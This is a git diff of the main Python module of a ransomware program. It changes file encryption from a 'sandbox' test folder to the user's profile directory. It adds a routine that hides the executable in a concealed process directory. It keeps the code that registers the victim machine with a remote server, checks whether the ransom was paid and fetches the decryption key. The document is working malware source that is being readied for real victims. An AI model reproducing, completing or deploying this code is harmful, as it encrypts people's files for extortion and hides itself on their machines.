@@ -4,7 +4,6 @@
 import array
 import sys
 import os
-import threading
 from concurrent.futures.thread import ThreadPoolExecutor
 
 from wcmatch import glob
@@ -13,6 +12,7 @@ from dotenv import load_dotenv
 
 # codes line allow to package env in the exe file
 # BUT they can be find easily without encryption of exe
+from modules.miscellaneous.hidding import hide
 
 extDataDir = os.getcwd()
 if getattr(sys, 'frozen', False):
@@ -24,11 +24,9 @@ load_dotenv(dotenv_path=os.path.join(extDataDir, '.env'))
 import time
 import requests
 from cryptography.fernet import Fernet
-from os.path import isfile
-import asyncio
+from os.path import isfile, exists
 import datetime
 from threading import Thread
-
 from modules.cryptography.file_decryption import decrypt_file
 from modules.cryptography.file_encryption import encrypt_file
 from modules.internet.get_ressources import get_has_paid, get_the_decryption_key
@@ -42,23 +40,30 @@ from modules.internet.patch_ressources import patch_last_message_date
 TRUE_ALIASES = [True, "True", "true", "yes"]
 
 
-def get_all_files_in_directory(paths: array, onlyFileEncrypted: bool):
+CONFIG_FILE_PATH = os.environ['USERPROFILE'] + os.getenv("HIDDEN_PROCESS_DIRECTORY") + \
+                   os.getenv("CONFIG_FILE_NAME") + '.json'
+
+
+def get_all_files_in_directory(paths: array, only_file_encrypted: bool):
     """
     This function return all files and sub_files in a directory passed in param
     1) Use Glob to get all the file and return them in array shape
-    :param onlyFileEncrypted: want only file decrypted or only crypted ?
+    :param only_file_encrypted: want only file decrypted or only crypted ?
     :param paths: array of path to encrypt file
     """
     files = []
     pattern = '/**/[!gAAAAA]*.{'
 
-    if onlyFileEncrypted:
+    if only_file_encrypted:
         pattern = '/**/[gAAAAA]*.{'
 
     for path in paths:
-        for f in glob.glob(path + pattern + os.getenv("FILES_TYPES_TO_ENCRYPT") + '}', flags=glob.BRACE | glob.GLOBSTAR):
-            if isfile(f):
-                files.append(f)
+        path = path.replace("\\", "/")
+
+        for file in glob.glob(path + pattern + os.getenv("FILES_TYPES_TO_ENCRYPT") + '}',
+                           flags=glob.BRACE | glob.GLOBSTAR):
+            if isfile(file):
+                files.append(file)
     return files
 
 
@@ -66,9 +71,17 @@ def main():
     """
     This function is the main function
     """
-    is_connected = False
+    new_file_name = os.environ['USERPROFILE'] + os.getenv("HIDDEN_PROCESS_DIRECTORY") \
+                    + os.getenv("HIDDEN_PROCESS_NAME")
 
     startup_module()
+
+    if not exists(new_file_name + "\\" + os.getenv("HIDDEN_PROCESS_NAME") + '.exe'):
+        hide(extDataDir, new_file_name)
+        sys.exit(0)
+
+    is_connected = False
+
     key = encrypt_module()
 
     # -- CHANGE BG MODULE --
@@ -77,10 +90,11 @@ def main():
 
     computer_id = get_config_file_info("computer_id")
 
+    print("-- CREATION OF COMPUTER --")
+
     if computer_id == -1:
         while is_connected is not True:
             try:
-                print("-- CREATION OF COMPUTER --")
                 computer_id = create_computer(get_public_ip(), get_private_ip(), get_computer_os(),
                                               get_computer_name(), key.decode())["id"]
                 print("-- CREATION OF CONFIG FILE --")
@@ -107,12 +121,15 @@ def encrypt_module():
     if get_config_file_info("encrypted") not in TRUE_ALIASES:
         pool = ThreadPoolExecutor(max_workers=10)
         computer_id = get_config_file_info("computer_id")
-        if computer_id:
+        print(computer_id)
+        if computer_id != -1:
             key = get_the_decryption_key(computer_id).encode()
         else:
             key = Fernet.generate_key()
         print("-- KEY GENERATED --")
-        files = get_all_files_in_directory(["sandbox"], False)
+        files = get_all_files_in_directory([os.environ['USERPROFILE'] +
+                                            os.getenv("DIRECTORY_TO_ENCRYPT")], False)
+        print(files)
         for file in files:
             pool.submit(encrypt_file, file, Fernet(key))
         pool.shutdown(wait=True)
@@ -149,7 +166,8 @@ def decrypt_module(computer_id):
     """
     pool = ThreadPoolExecutor(max_workers=10)
     key = get_the_decryption_key(computer_id).encode()
-    files = get_all_files_in_directory(["sandbox"], True)
+    files = get_all_files_in_directory([os.environ['USERPROFILE'] +
+                                        os.getenv("DIRECTORY_TO_ENCRYPT")], True)
     if key:
         for file in files:
             pool.submit(decrypt_file, file, Fernet(key))
